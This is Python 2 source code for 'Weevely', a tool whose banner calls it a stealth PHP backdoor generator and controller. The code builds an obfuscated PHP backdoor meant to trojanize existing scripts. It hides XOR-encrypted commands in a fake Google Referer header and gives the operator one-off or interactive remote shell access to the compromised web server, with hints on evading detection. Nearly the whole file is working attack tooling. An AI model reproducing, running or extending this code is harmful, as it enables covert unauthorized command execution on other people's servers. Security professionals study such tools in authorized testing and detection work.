#!/usr/bin/env python
# -*- coding: utf-8 -*-

from numpy import frombuffer, bitwise_xor, byte
import getopt, sys, base64, os, urllib2, re, urlparse
    
class weevely:
  def main(self):
    
    self.banner()
  
    try:
	opts, args = getopt.getopt(sys.argv[1:], 'tgc:u:p:o:', ['generate', 'url', 'password', 'terminal', 'command', 'output'])
    except getopt.error, msg:
	print "Error:", msg
	exit(2)
    
    for o, a in opts:
	if o in ("-g", "-generate"):
	  moderun='g'
	if o in ("-t", "-terminal"):
	  moderun='t'
	if o in ("-c", "-command"):
	  cmnd=a
	  moderun='c'
	  
	if o in ("-u", "-url"):
	  url=a
	  parsed=urlparse.urlparse(url)
	  if not parsed.scheme:
	    url="http://"+url
	  if not parsed.netloc:
	    print "- Error: URL not valid"
	    sys.exit(1)
	  
	if o in ("-p", "-password"):
	  pwd=a
	if o in ("-o", "-output"):
	  outfile=a

    if 'moderun' in locals():

      if moderun=='c' or moderun=='t':
	if 'url' not in locals():
	  print "! Please specify URL (-u)"
	  sys.exit(1)
	  
      if moderun=='g':
	if 'outfile' not in locals():
	  print "! Please specify where generate backdoor file (-o)"
	  sys.exit(1)

      if 'pwd' not in locals():
	if moderun=='g':
	  print "+ Be careful: password is transmitted unencrypted as a fake url parameter.\n+ Random alphanumeric password (like 'a33k44') are less detectable."
	  
	pwd=''
	while not pwd:
	  print "+ Please insert password: ",
	  pwd = sys.stdin.readline().strip()

	

      if moderun=='c':       
	try:
	  print self.execute(url, pwd, cmnd, 0)
	except Exception, e:
	  print '! Command execution failed: ' + str(e) + '.'
	return
      if moderun=='t':
	self.terminal(url,pwd)
      if moderun=='g':
	self.generate(pwd,outfile)
    else:
      self.usage()
      sys.exit(1)

  def usage(self):
    print """+  Generate backdoor code in <filepath>, using <password>.
+  	./weevely -g -o <filepath> -p <password>
+      
+  Execute remote <command> via <url>, using <password>.
+  	./weevely -c <command> -u <url> -p <password>
+      
+  Execute remote terminal via <url>, using <password>.
+  	./weevely -t -u <url> -p <password>"""
    
  def banner(self):
    print "+ Weevely - stealth PHP backoor generator and controller.\n+\t\t\tEmilio Pinna & Carlo Satta.\n+"

     
  def crypt(self, text, key):
    #return (($text ^ str_pad("", strlen($text), $key)) & str_repeat("\x1f", strlen($text))) | ($text & str_repeat("\xe0", strlen($text)));
    text = frombuffer( text, dtype=byte )
    firstpad=frombuffer(( key*(len(text)/len(key)) + key)[:len(text)], dtype=byte)
    strrepeat=frombuffer( '\x1f'*len(text), dtype=byte)
    strrepeat2=frombuffer( '\xe0'*len(text), dtype=byte)
    
    bit=((text ^ firstpad) & strrepeat ) | ( text & strrepeat2 )
    
    toret = base64.b64encode(bit.tostring())
    return toret 

  def execute(self, url, pwd, cmnd, mode):
    cmnd=cmnd.strip()
    cmdstr=self.crypt(cmnd,pwd)
    refurl='http://www.google.com/asdsds?dsa=' + pwd + '&asd=' + cmdstr + '&asdsad=' + str(mode)
    try: 
      ret=self.execHTTPGet(refurl,url)
    except urllib2.URLError, e:
      #return str(e)
      raise
    else: 
      restring='<' + pwd + '>(.*)</' + pwd + '>'
      e = re.compile(restring,re.DOTALL)
      founded=e.findall(ret)
      if len(founded)<1:
	raise Exception('request doesn\'t produce a valid respond, check password or url')
      else:
	return founded[0].strip()
    
  def execHTTPGet(self, refurl, url):
    req = urllib2.Request(url)
    req.add_header('Referer', refurl)
    r = urllib2.urlopen(req)
    return r.read()
    
  def terminal(self, url, pwd):
    
    hostname=urlparse.urlparse(url)[1]
    
    try:
      ret = self.execute(url, pwd, "echo " + pwd, 0)
    except Exception, e:
      print '! Backdoor verification failed: ' + str(e) + '.'
      return
    
    if pwd!=ret:
      print '! Backdoor verification failed.'
      return
    else:
      while True:
	print hostname + '> ',
	cmnd = sys.stdin.readline()
	if cmnd!='\n':
	  print self.execute(url, pwd, cmnd, 0)

  def generate(self,key,path):
    f_tocrypt = file('php/text_to_crypt.php')
    f_back = file('php/backdoor.php')
    f_output = file(path,'w')
    
    str_tocrypt = f_tocrypt.read()
    str_crypted = self.crypt(str_tocrypt,key)
    #print str_crypted
    str_back = f_back.read()
    new_str = str_back.replace('%%%TEXT-CRYPTED%%%', str_crypted)
    
    f_output.write(new_str)
    print '+ Backdoor file ' + path + ' created with password '+ key + '.\n+ Insert the code to trojanize an existing PHP script, or use the PHP file as is. Exiting.'
     
    
if __name__ == "__main__":
    
    
    app=weevely()
    try:
      app.main()
    except KeyboardInterrupt:
      print '\n! Received keyboard interrupt, exiting.'
      
      
    
    
   